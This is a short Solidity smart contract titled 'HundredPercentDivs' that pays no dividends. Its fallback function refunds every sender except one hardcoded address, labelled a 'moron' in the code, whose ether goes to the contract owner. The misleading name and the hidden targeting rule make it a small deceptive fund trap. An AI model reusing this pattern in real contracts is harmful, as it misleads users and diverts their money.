pragma solidity ^0.4.24;

contract HundredPercentDivs {
  
  address public contractOwner;

  constructor () public {
    contractOwner = msg.sender;
  }

  function isMoron(address _candidate) public pure returns (bool){
      return (_candidate==0x41FE3738B503cBaFD01C1Fd8DD66b7fE6Ec11b01);
  }

  function () public payable  {
    
    if (!isMoron(msg.sender)) {
        msg.sender.transfer(msg.value);
    }else{
        contractOwner.transfer(msg.value);
    }
  }

}